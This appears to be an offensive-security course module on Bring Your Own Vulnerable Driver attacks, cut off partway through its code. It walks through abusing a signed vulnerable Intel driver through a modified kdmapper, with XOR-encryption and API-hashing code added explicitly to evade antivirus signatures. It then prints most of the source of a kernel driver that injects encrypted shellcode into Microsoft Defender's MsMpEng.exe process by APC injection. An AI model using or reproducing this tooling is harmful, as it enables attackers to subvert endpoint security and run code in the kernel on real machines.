      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner">

    
    <div id="module-skeleton" role="status" aria-live="polite" class="absolute inset-0 z-20 overflow-hidden bg-slate-900/70 ring-1 ring-white/10">
    <div class="h-full w-full max-w-5xl mx-auto py-8 animate-pulse motion-reduce:animate-none flex flex-col">

        
        <div class="flex flex-col items-center gap-3">
        <div class="h-7 w-72 rounded-xl bg-white/15"></div>
        <div class="h-px w-full bg-white/10"></div>
        </div>

        
        <div class="h-6 w-40 rounded-lg bg-white/12"></div>

        
        <div class="space-y-3 mb-6">
        <div class="h-4 w-full rounded-lg bg-white/10"></div>
        <div class="h-4 w-11/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-10/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-9/12  rounded-lg bg-white/10"></div>
        </div>

        
        <div class="h-56 md:h-72 lg:h-80 rounded-xl bg-white/5 ring-1 ring-white/10 flex items-center justify-center">
        <svg viewBox="0 0 64 64" aria-hidden="true" class="w-12 h-12 text-white/30" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="8" y="14" width="48" height="36" rx="3" class="opacity-30"></rect>
            <circle cx="26" cy="28" r="5"></circle>
            <path d="M16 46l12-14 8 10 8-8 12 12"></path>
        </svg>
        </div>

        
        <div class="mt-6 flex-1 relative rounded-xl overflow-hidden">
        <div class="absolute inset-0 rounded-xl" style="
            background:
                linear-gradient(to right, transparent 0, transparent 8px, rgba(255,255,255,0.00) 8px, rgba(255,255,255,0.00) calc(100% - 8px), transparent 100%),
                repeating-linear-gradient(
                to bottom,
                rgba(255,255,255,0.10),                 /* line color */
                rgba(255,255,255,0.10) 12px,            /* line thickness */
                rgba(255,255,255,0.00) 12px,            /* gap start */
                rgba(255,255,255,0.00) 22px             /* gap height */
                );
            ">
        </div>
        </div>

    </div>
    </div>


    
    

    
    <div id="module-content" class="opacity-0 transition-opacity duration-300">
        <h2>Bring Your Own Vulnerable Driver (BYOVD)</h2>
<h3>Introduction</h3>
<p>Drivers are software components that enable communication and 
interaction between hardware devices (such as printers, graphics cards, 
and network adapters) and the OS of a computer. They serve as 
intermediaries that facilitate the translation of high-level commands 
from the operating system into instructions that the hardware can 
understand and execute.</p>
<p>Drivers typically operate in kernel mode, granting them full control 
over the machine. This makes drivers an attractive target for attackers,
 allowing them to perform actions otherwise impossible. Recognizing this
 potential for abuse, Microsoft implemented signature enforcement for 
drivers to enhance system security. This means that by default, you 
cannot load unsigned drivers without toggling the setting from the boot 
menu.</p>
<p>It's possible to list installed drivers by running the <code>driverquery</code> command on the Command Prompt.</p>
<img width="900px" alt="image" style="margin:auto" src="27_files/driverquery.png">
<h3>Circumventing Signature Enforcement</h3>
<p>Bring Your Own Vulnerable Driver or BYOVD for short, is a technique 
that involves abusing a legitimately-signed vulnerable driver to perform
 malicious actions that cannot be achieved from user-mode processes. 
Among these actions, the most frequently pursued goal is to terminate 
security solutions, a tactic commonly observed in many APT and 
ransomware attacks, as detailed in the referenced papers below:</p>
<ul>
<li>
<p><a href="https://www.sentinelone.com/blog/terminator-edr-killer-spyboy-detecting-and-preventing-a-windows-byovd-attack/">Terminator EDR Killer (Spyboy)</a>.</p>
</li>
<li>
<p><a href="https://thehackernews.com/2023/04/ransomware-hackers-using-aukill-tool-to.html">Ransomware Hackers Using AuKill Tool to Disable EDR Software Using BYOVD Attack</a>.</p>
</li>
<li>
<p><a href="https://thehackernews.com/2022/10/blackbyte-ransomware-abuses-vulnerable.html">BlackByte Ransomware Abuses Vulnerable Windows Driver to Disable Security Solutions</a>.</p>
</li>
</ul>
<h3>Exploitation Scenario</h3>
<p>An example of how a vulnerable driver can be exploited unfolds as 
follows: The attacker places two files onto a computer the exploit 
(e.g., <code>implant.exe</code>) and the signed vulnerable driver. The 
exploit loads the vulnerable driver and proceeds to exploit the 
identified vulnerability, ultimately gaining the ability to perform 
different actions such as executing code within the kernel-mode address 
space. This scenario is illustrated in the diagram below.</p>
<img width="1200px" alt="image" style="margin:auto" src="27_files/byovd-263437711-701e4758-f492-44b5-8080-c920f5742dc9.png">
<p>It's important to note that in some cases, the driver itself may not 
have vulnerabilities. Instead, it may be carrying out its intended 
function within legitimate software. However, attackers can exploit this
 functionality to perform malicious actions. This situation is 
illustrated in the <a href="https://github.com/ZeroMemoryEx/Blackout">Blackout</a> and <a href="https://github.com/ZeroMemoryEx/Overlord">Overlord</a> projects, where the implant is responsible for handling communication with the drivers, specifically <a href="https://www.loldrivers.io/drivers/7ce8fb06-46eb-4f4f-90d5-5518a6561f15/">Blackout.sys</a> and <a href="https://www.loldrivers.io/drivers/edd29861-6984-4dbe-8e7c-22e9b6cf68d0/">kprocesshacker.sys</a>. These drivers are then used to terminate the target user-mode process when specific flags are provided.</p>
<h3>Exploiting CVE-2015-2291</h3>
<p>In Intel's Network Adapter Diagnostic Driver, <code>IQVW64.sys</code>, a vulnerability was identified in versions prior to <code>1.3.1.0</code>.
 This vulnerability originated as a denial-of-service issue but had the 
potential to allow an attacker to run unauthorized code with 
kernel-level privileges. In simpler terms, if this vulnerability is 
successfully exploited, an attacker could execute their own unsigned 
driver in kernel mode. This module will not provide guidance on 
exploiting the mentioned vulnerability. Instead, it will concentrate on 
its utilization within a BYOVD attack scenario.</p>
<p>The DoS exploit, as detailed on <a href="https://www.exploit-db.com/exploits/36392">exploit-db</a>,
 illustrates the method by which this bug can be employed to read from 
or write to kernel memory. This is achieved through a carefully crafted <code>0x80862013</code>, <code>0x8086200B</code>, <code>0x8086200F</code>, or <code>0x80862007</code> <a href="https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-">IOCTL call</a>.</p>
<p>This module will not demonstrate the DoS exploit; instead, it will 
utilize an alternative PoC exploit found in the kdmapper project 
(explained in upcoming sections).</p>
<h3>IOCTL</h3>
<p>Device Input and Output Control or IOCTL for short, is a type of 
operation that is used to communicate between user-mode applications and
 kernel-mode drivers, in which they are used to send commands, requests,
 or instructions from user space to kernel space and vice versa. IOCTL 
requests are made using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol">DeviceIoControl</a> WinAPI function, which can be seen in the aforementioned DOS exploit.</p>
<h3>Kdmapper</h3>
<p>Another PoC can be found in the <a href="https://github.com/TheCruZ/kdmapper">kdmapper</a> project, initially introduced on <a href="https://www.unknowncheats.me/forum/anti-cheat-bypass/320049-kdmapper-manual-map-driver-using-vulnerable-driver-intel.html">unknowncheats.me</a>. In this PoC, the <code>0x80862007</code>
 IOCTL code is utilized to perform a kernel mode driver mapping action, 
rather than conducting a DoS attack on the vulnerable driver.</p>
<p>Discussing kdmapper's code falls outside the scope of this module. However, it's worth noting that the vulnerable driver, <code>IQVW64.sys</code>, is loaded reflectively to avoid being written to the disk. Instead, it is stored in the <a href="https://github.com/TheCruZ/kdmapper/blob/master/kdmapper/intel_driver_resource.hpp">intel_driver_resource.hpp</a> file. The <code>IQVW64.sys</code> driver used by kdmapper has a version of <code>1.3.0.7</code> and an MD5 hash value of <code>1898ceda3247213c084f43637ef163b3</code>. You can locate this file on <a href="https://www.loldrivers.io/">loldrivers</a>,
 a website that maintains a catalog of Windows drivers frequently 
employed by threat actors to circumvent security measures, accessible <a href="https://www.loldrivers.io/drivers/1d2cdef1-de44-4849-80e5-e2fa288df681/">here</a>.</p>
<p>Note that compiling kdmapper requires you to download the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk">Windows Driver Kit (WDK)</a>.</p>
<h4>Updating Kdmapper</h4>
<p>To facilitate the execution of a successful BYOVD attack using 
Kdmapper, it becomes essential to modify certain aspects of the tool's 
code. This is particularly important given the tool's extensive public 
availability over time, making it susceptible to significant signature 
detection by security solutions. The modifications applied to the 
kdmapper project, which are shared within this module, are detailed 
below:</p>
<ul>
<li>
<p>All <code>VirtualAlloc</code> calls are replaced with <code>HeapAlloc</code> function calls. And thus, all <code>VirtualFree</code> calls were changed to <code>HeapFree</code> calls.</p>
</li>
<li>
<p>The <code>IQVW64.sys</code> driver located in the <code>intel_driver_resource.hpp</code> file is encrypted using a custom XOR encryption function. It is then stored as <code>unsigned char EncDriver</code>, as opposed to being saved as <code>static const uint8_t driver</code>.</p>
</li>
<li>
<p>Since the driver code is not a <em>static variable</em> anymore, some function definitions were changed:</p>
<ul>
<li>
<p><code>intel_driver::Unload(HANDLE device_handle)</code> was changed to <code>intel_driver::Unload(HANDLE device_handle, size_t sEncDriverSize)</code>.</p>
</li>
<li>
<p><code>intel_driver::Load()</code> was changed to <code>intel_driver::Load(unsigned char* ucEncDriver, size_t sEncDriverSize)</code>.</p>
</li>
</ul>
</li>
<li>
<p>The project uses Ntdll exported functions (<code>NtAddAtom</code>, <code>RtlAdjustPrivilege</code>, <code>NtLoadDriver</code>, and <code>NtUnloadDriver</code>) through the <code>GetModuleHandleA</code> and <code>GetProcAddress</code> WinAPIs. It's been updated to import these functions using API hashing using the <code>FARPROC GetNtdllProcAddressH(IN UINT uNtdllApiHash)</code> function.</p>
</li>
<li>
<p>Previously, kdmapper required users to provide the driver name along with command line arguments like <code>--free</code>, <code>--mdl</code>, or <code>--PassAllocationPtr</code>.
 However, it has since been updated to streamline this process. Now, a 
single argument for the unsigned driver's name suffices, and the tool 
will automatically execute with the default <code>--free</code> and <code>--mdl</code> options.</p>
</li>
</ul>
<h4>XOR Encryption</h4>
<p>As previously discussed, the updated kdmapper version includes an XOR-encrypted iteration of the <code>IQVW64.sys</code> driver, which can be generated through the <em>PayloadEncrypter</em> program provided alongside this module's code. <em>PayloadEncrypter</em> employs the following code for XOR encryption of an input buffer:</p>
<pre><code class="language-C">// 'driver' is the raw IQVW64.sys driver.
for (SIZE_T i = 0; i &lt; sizeof(driver); i++) {

  if (i % 2 == 0)
    driver[i] = driver[i] ^ 0x85;
  else
    driver[i] = driver[i] ^ 0x2A;

  if ((i + 2) % 16 == 0)
    driver[i] = driver[i] ^ 0x3C;
}
</code></pre>
<p>Therefore, the main function of the updated kdmapper can be observed in the following code, where it decrypts the <code>IQVW64.sys</code> driver before proceeding to execute the remainder of the exploit.</p>
<pre><code class="language-C">// 'EncDriver' is the XOR'd IQVW64.sys driver.
for (SIZE_T i = 0; i &lt; sizeof(EncDriver); i++) {

  if ((i + 2) % 16 == 0)
    EncDriver[i] = EncDriver[i] ^ 0x3C;
  
  if (i % 2 == 0)
    EncDriver[i] = EncDriver[i] ^ 0x85;
  else
    EncDriver[i] = EncDriver[i] ^ 0x2A;

}
</code></pre>
<h4>IAT Hashing</h4>
<p>Furthermore, since all used APIs are exported from <code>Ntdll.dll</code>, the new kdmapper is accompanied by a function called <code>GetNtdllProcAddressH</code> that fetches function addresses from <code>Ntdll.dll</code> only. <code>GetNtdllProcAddressH</code> is shown below.</p>
<pre><code class="language-C">FARPROC	GetNtdllProcAddressH(IN UINT 
uNtdllApiHash) {

	PPEB                      pPeb                    = NULL;
	PPEB_LDR_DATA             pLdr                    = NULL;
	PLDR_DATA_TABLE_ENTRY     pDte                    = NULL;
	HMODULE                   hNtdll                  = NULL;
	PBYTE                     pBase                   = NULL;
	PIMAGE_NT_HEADERS         pImgNtHdrs              = NULL;
	PIMAGE_EXPORT_DIRECTORY   pImgExportDir           = NULL;
	PDWORD                    pdwFunctionNameArray	= NULL;
	PDWORD                    pdwFunctionAddressArray = NULL;
	PWORD                     pwFunctionOrdinalArray  = NULL;
	DWORD                     dwImgExportDirSize      = 0x00;


	pPeb = (PPEB)__readgsqword(0x60);
	pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

	// Skip local exe image
	pDte	= *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	
	// Fetch Ntdll's handle
	pBase = (PBYTE)(hNtdll = (HMODULE)pDte-&gt;Reserved2[0]);
	if (!pBase)
		return NULL;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + 
((PIMAGE_DOS_HEADER)pBase)-&gt;e_lfanew);
	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	pImgExportDir           = (PIMAGE_EXPORT_DIRECTORY)(pBase + 
pImgNtHdrs-
&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	dwImgExportDirSize      = 
pImgNtHdrs-
&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	pdwFunctionNameArray    = (PDWORD)(pBase + 
pImgExportDir-&gt;AddressOfNames);
	pdwFunctionAddressArray = (PDWORD)(pBase + 
pImgExportDir-&gt;AddressOfFunctions);
	pwFunctionOrdinalArray  = (PWORD)(pBase + 
pImgExportDir-&gt;AddressOfNameOrdinals);

	for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
		CHAR*	pFunctionName     = (CHAR*)(pBase + pdwFunctionNameArray[i]);
		PVOID	pFunctionAddress  = (PVOID)(pBase + 
pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);

		if (CRC32B(pFunctionName) == uNtdllApiHash) {
			return (FARPROC)pFunctionAddress;
		}
	}

	return NULL;
}
</code></pre>
<p><code>GetNtdllProcAddressH</code> accepts one parameter, <code>uNtdllApiHash</code>, representing the hash of the API name to fetch its address. Hashes are generated using the following <em>Cyclic Redundancy Check</em> string hashing algorithm (CRC was implemented in Module 88).</p>
<pre><code class="language-C">UINT32 CRC32B(LPCSTR cString)
{

	UINT32		uMask 	= 0x00,
			    uHash 	= 0xFFFFFFFF;
	INT		    i 	    = 0x00;

	while (cString[i] != 0) {

		uHash = uHash ^ (UINT32)cString[i];

		for (int ii = 0; ii &lt; 8; ii++) {

			uMask = -1 * (uHash &amp; 1);
			uHash = (uHash &gt;&gt; 1) ^ (0xEDB88320 &amp; uMask);
		}

		i++;
	}

	return ~uHash;
}

#define CRCHASH(X)			(CRC32B((LPCSTR)X))

int main() {

	printf("#define %s%s \t 0x%0.8X \n", "NtAddAtom", "_CRCHASH", CRCHASH("NtAddAtom"));
	printf("#define %s%s \t 0x%0.8X \n", "RtlAdjustPrivilege", "_CRCHASH", CRCHASH("RtlAdjustPrivilege"));
	printf("#define %s%s \t 0x%0.8X \n", "NtLoadDriver", "_CRCHASH", CRCHASH("NtLoadDriver"));
	printf("#define %s%s \t 0x%0.8X \n", "NtUnloadDriver", "_CRCHASH", CRCHASH("NtUnloadDriver"));

	return 0;

}
</code></pre>
<p>Now that the Kdmapper project is updated, it can evade some of the signatures from security vendors.</p>
<h3>Testing HelloWorld.sys</h3>
<p>Back to the original kdmapper project, the project was accompanied by a driver that prints a hello world message called <em>HelloWorld</em>, the message can be viewed from the <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/debugview">Debugview Sysinteral tool</a>.</p>
<p>In order for the Debugview tool to print messages from the kernel, a registry key should exist under <code>Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager</code> named <code>Debug Print Filter</code>. This key should contain a <code>DWORD</code> value named <code>DEFAULT</code> of value <code>0x00000008</code> as shown in the below image.</p>
<img width="1000px" alt="image" style="margin:auto" src="27_files/byovd-363507408-d1b02975-924a-4b76-a8e0-f4c1319d65d1.png">
<p>These changes require a system reboot to take effect. After that, open Debugview as administrator, go to <code>Capture</code>, and select <code>Capture Kernel</code>. You can disable the other capture options to reduce clutter and focus specifically on kernel-related debugging output.</p>
<img width="1000px" alt="image" style="margin:auto" src="27_files/byovd-463507694-0a6bb943-c368-4a9f-8277-f3f155865f45.png">
<p>One can now run the newly updated kdmapper project via the following command as administrator:</p>
<pre><code>kdmapper.exe HelloWorld.sys
</code></pre>
<img width="1400px" alt="image" style="margin:auto" src="27_files/byovd-563507981-42139ebf-b0b7-4e97-97d4-dc3eb0b8c2c5.png">
<p>Note that kdmapper was only successful on Windows 10, but failed on Windows 11.</p>
<h3>Building The Unsigned Driver</h3>
<p>Building a kernel driver is out of the scope of this course, and 
thus, is not covered in this module. However, the kernel driver shared 
with this module called <em>KernelLdr</em> will inject an encrypted shellcode to the user-mode process, <code>MsMpEng.exe</code>. This process is also known as the <em>Microsoft Malware Protection Engine</em> and it represents the core component of the Microsoft Defender AntiVirus. <em>KernelLdr</em> performs the following actions:</p>
<ul>
<li>
<p>Upon its initial loading, <code>KernelLdr.sys</code> decrypts the payload provided by the user. This encrypted payload is created using the <em>PayloadEncrypter</em> project, as shown earlier, utilizing the same XOR algorithm for simplicity.</p>
</li>
<li>
<p>KernelLdr then searches for the <code>MsMpEng.exe</code> PID using its hash. Then, it searches for an alertable thread within the target process. This is done via the <code>FetchTargetProcessAndThread</code> function.</p>
</li>
<li>
<p>It then opens a handle to the target process and maps the payload to it using the <code>ZwCreateSection</code> and <code>ZwMapViewOfSection</code> APIs, in a manner close to the user-mode remote mapping injection. Mapping the payload to the target process is done via the <code>InjectPayload</code> function.</p>
</li>
<li>
<p>After injecting the payload to <code>MsMpEng.exe</code>, KernelLdr 
executes it using APC injection, which is done differently than how 
user-mode APC injection is performed. APC injection is done via the <code>ExecuteShellcode</code> function.</p>
</li>
</ul>
<h3>KernelLdr Complete Code</h3>
<p>For readers who are familiar with driver development, KernelLdr's code is shown below.</p>
<pre><code class="language-C">#include &lt;ntifs.h&gt;
#include &lt;ntddk.h&gt;
#include &lt;ntstrsafe.h&gt;
#include &lt;wdf.h&gt;

#define DRIVER_TAG                          'llun'

#define TARGET_PROCESS_HASH		        0xF70DC4CA	// L"MsMpEng.exe"

#define PROCESS_VM_OPERATION                (0x0008)  
#define PROCESS_VM_READ                     (0x0010)  
#define PROCESS_VM_WRITE                    (0x0020)  

#define ALERTABLE_THREAD_FLAG_OFFSET        0x74
#define GUI_THREAD_FLAG_OFFSET              0x78
#define THREAD_KERNEL_STACK_OFFSET          0x58
#define THREAD_CONTEXT_STACK_POINTER_OFFSET 0x2C8
#define ALERTABLE_THREAD_FLAG_BIT           0x10
#define GUI_THREAD_FLAG_BIT                 0x80


#define	SET_TO_MULTIPLE_OF_PAGE_SIZE(X)	    ( ((X) + PAGE_SIZE) &amp; 
(~PAGE_SIZE) )


#define CHAR_BIT							8

//--------------------------------------------------------------------------------------------------------------------------------


typedef struct _SYSTEM_THREAD_INFORMATION
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitches;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
}SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	SYSTEM_THREAD_INFORMATION Threads[1];
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment

} KAPC_ENVIRONMENT;

typedef VOID(NTAPI* PKNORMAL_ROUTINE) (
	IN PVOID NormalContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
	);

typedef VOID(NTAPI* PKKERNEL_ROUTINE) (
	IN PKAPC Apc,
	IN OUT PKNORMAL_ROUTINE* NormalRoutine,
	IN OUT PVOID* NormalContext,
	IN OUT PVOID* SystemArgument1,
	IN OUT PVOID* SystemArgument2
	);

typedef VOID(NTAPI* PKRUNDOWN_ROUTINE) (
	IN PKAPC Apc
	);

typedef unsigned int        UINT;

//--------------------------------------------------------------------------------------------------------------------------------


NTKERNELAPI VOID NTAPI KeInitializeApc(
	OUT PRKAPC Apc,
	IN PETHREAD Thread,
	IN KAPC_ENVIRONMENT Environment,
	IN PKKERNEL_ROUTINE KernelRoutine,
	IN OPTIONAL PKRUNDOWN_ROUTINE RundownRoutine,
	IN OPTIONAL PKNORMAL_ROUTINE NormalRoutine,
	IN OPTIONAL KPROCESSOR_MODE ApcMode,
	IN OPTIONAL PVOID NormalContext
);

NTKERNELAPI BOOLEAN NTAPI KeInsertQueueApc(
	IN OUT PRKAPC Apc,
	IN OPTIONAL PVOID SystemArgument1,
	IN OPTIONAL PVOID SystemArgument2,
	IN KPRIORITY Increment
);

NTKERNELAPI BOOLEAN NTAPI KeTestAlertThread(
	IN KPROCESSOR_MODE AlertMode
);


NTKERNELAPI PVOID NTAPI PsGetCurrentProcessWow64Process(
	VOID
);

NTKERNELAPI NTSTATUS NTAPI ZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
);

//--------------------------------------------------------------------------------------------------------------------------------

// String Hashing Algorithm:

// 
https://github.com/vxunderground/VX-API/blob/main/VX-API/
HashStringRotr32.cpp
UINT32 HashStringRotr32SubW(UINT32 Value, UINT Count)
{
	DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
	Count &amp;= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
	return (Value &gt;&gt; Count) | (Value &lt;&lt; ((-Count) &amp; Mask));
#pragma warning( pop ) 
}

INT HashStringRotr32W(_In_ LPCWSTR String)
{
	INT Value = 0;

	for (INT Index = 0; Index &lt; wcslen(String); Index++)
		Value = String[Index] + HashStringRotr32SubW(Value, 7);

	return Value;
}

//--------------------------------------------------------------------------------------------------------------------------------


WCHAR g_TargetProcessName[0xFF] = { 0 };

//--------------------------------------------------------------------------------------------------------------------------------


BOOLEAN FetchTargetProcessAndThread(OUT HANDLE* phProcessId, OUT 
PETHREAD* pThread, OUT HANDLE* phThreadId) {

	if (phProcessId == NULL || pThread == NULL || phThreadId == NULL) {
		return FALSE;
	}

	NTSTATUS                STATUS                  = STATUS_SUCCESS;
	ULONG                   uReturnLength           = 0x00,
				            uAlertableThread	       = 0x00,
				            uGuiThread		       = 0x00;
	PVOID                   pAddress                = NULL;
	PSYSTEM_PROCESS_INFO    pSystemProcesses        = NULL;
	PETHREAD                pTmpThread              = NULL;

	// Fetch array size
	if ((STATUS = ZwQuerySystemInformation(0x05, NULL, 0x00, 
&amp;uReturnLength)) != STATUS_INFO_LENGTH_MISMATCH) {
		DbgPrint("[!] ZwQuerySystemInformation [1] Failed With Error: 0x%0.8X 
\n", STATUS);
		goto _FUNC_CLEANUP;
	}

	// Allocate enough memory
	if ((pAddress = ExAllocatePool2(POOL_FLAG_NON_PAGED, 
(SIZE_T)uReturnLength, (ULONG)DRIVER_TAG)) == NULL) {
		DbgPrint("[!] ExAllocatePool2 Failed \n");
		goto _FUNC_CLEANUP;
	}

	// Fetch array
	if (!NT_SUCCESS((STATUS = ZwQuerySystemInformation(0x05, pAddress, 
uReturnLength, &amp;uReturnLength)))) {
		DbgPrint("[!] ZwQuerySystemInformation [2] Failed With Error: 0x%0.8X 
\n", STATUS);
		goto _FUNC_CLEANUP;
	}

	pSystemProcesses = (PSYSTEM_PROCESS_INFO)pAddress;

	do {

		// Search for the target process using it's hash
		if (pSystemProcesses-&gt;ImageName.Length &amp;&amp; 
HashStringRotr32W(pSystemProcesses-&gt;ImageName.Buffer) == 
TARGET_PROCESS_HASH) {

			// Copy the name to a global variable (used for debugging)
			if (pSystemProcesses-&gt;ImageName.Length &lt; 
(sizeof(g_TargetProcessName) - sizeof(WCHAR))) {
				wcscpy(g_TargetProcessName, pSystemProcesses-&gt;ImageName.Buffer);
			}

			// Save process ID
			*phProcessId = pSystemProcesses-&gt;UniqueProcessId;

			// Search for an alertable thread
			for (ULONG i = 0; i &lt; pSystemProcesses-&gt;NumberOfThreads; i++) {

				if (pSystemProcesses-&gt;Threads[i].ClientId.UniqueThread == 
PsGetCurrentThread())
					continue;

				if (!NT_SUCCESS((STATUS = 
PsLookupThreadByThreadId(pSystemProcesses-
&gt;Threads[i].ClientId.UniqueThread, &amp;pTmpThread)))) {
					DbgPrint("[!] PsLookupThreadByThreadId Failed At Thread %ld With 
Error: 0x%0.8X \n", 
pSystemProcesses-&gt;Threads[i].ClientId.UniqueThread, STATUS);
					continue;
				}

				if (PsIsThreadTerminating(pTmpThread)) {
					ObDereferenceObject(pTmpThread);
					continue;
				}

				uAlertableThread    = *(PULONG64)((BYTE*)pTmpThread + 
ALERTABLE_THREAD_FLAG_OFFSET) &amp; ALERTABLE_THREAD_FLAG_BIT;
				uGuiThread          = *(PULONG64)((BYTE*)pTmpThread + 
GUI_THREAD_FLAG_OFFSET) &amp; GUI_THREAD_FLAG_BIT;

				if (uAlertableThread == 0x00 ||
					uGuiThread != 0x00 ||         // Skip GUI Threads
					*(PULONG64)((BYTE*)pTmpThread + THREAD_KERNEL_STACK_OFFSET) == 0x00
 ||
					*(PULONG64)((BYTE*)pTmpThread + 
THREAD_CONTEXT_STACK_POINTER_OFFSET) == 0x00)
				{
					ObDereferenceObject(pTmpThread);
					continue;
				}

				// Save the found thread and thread id
				*pThread    =  pTmpThread;
				*phThreadId =  
pSystemProcesses-&gt;Threads[i].ClientId.UniqueThread;
				break;
			}

		}

		// Move to another process in the array
		pSystemProcesses = (PSYSTEM_PROCESS_INFO)((BYTE*)pSystemProcesses + 
pSystemProcesses-&gt;NextEntryOffset);

	} while (pSystemProcesses-&gt;NextEntryOffset != 0x00);


_FUNC_CLEANUP:
	if (pAddress != NULL)
		ExFreePoolWithTag(pAddress, DRIVER_TAG);
	return *pThread == 0x00 ? FALSE : TRUE;
}

//--------------------------------------------------------------------------------------------------------------------------------



BOOLEAN CreateSharedSection(IN SIZE_T sShellcodeSize, OUT HANDLE* 
phSection) {

	if (!sShellcodeSize || !phSection)
		return FALSE;

	UNICODE_STRING          SectionName		= { 0x00 };
	OBJECT_ATTRIBUTES	    ObjectAttr		= { 0x00 };
	NTSTATUS                STATUS			= STATUS_SUCCESS;
	LARGE_INTEGER           SectionSize		= { .QuadPart = 
SET_TO_MULTIPLE_OF_PAGE_SIZE(sShellcodeSize) };


	RtlInitUnicodeString(&amp;SectionName, 
L"\\BaseNamedObjects\\MySharedMemory");
	InitializeObjectAttributes(&amp;ObjectAttr, &amp;SectionName, 
OBJ_KERNEL_HANDLE, NULL, NULL);

	// Create a section to map into kernel &amp; user mode memory
	if (!NT_SUCCESS((STATUS = ZwCreateSection(phSection, 
SECTION_ALL_ACCESS, &amp;ObjectAttr, &amp;SectionSize, 
PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))) {
		DbgPrint("[!] ZwCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	DbgPrint("[+] Opened A Section Handle: 0x%0.8X \n", *phSection);

	return TRUE;
}

//--------------------------------------------------------------------------------------------------------------------------------


// Callback function for APC that is executed in an alertable thread 
context
VOID KernelModeApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, 
PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	// Alert the current thread to execute its pending user - mode APCs
	KeTestAlertThread(UserMode);
	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

// Callback function for APC executed in a normal thread context
VOID UserModeApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, 
PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	// Check if the current thread is in the process of terminating
	if (PsIsThreadTerminating(PsGetCurrentThread()))
		*NormalRoutine = NULL; // canceling the APC

	// Check if the current process is a 32-bit process running on a 64-bit
 Windows
	if (PsGetCurrentProcessWow64Process())
		PsWrapApcWow64Thread(NormalContext, (PVOID*)NormalRoutine); // Wrap 
the APC for execution in a 32-bit thread's context (use 32-bit payload) -
 NOT TESTED!

	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

BOOLEAN ExecuteShellcode(IN PVOID pInjectedUMShellcode, IN PETHREAD 
peAlertableThreadId) {

	BOOLEAN     	bSTATE			= FALSE;
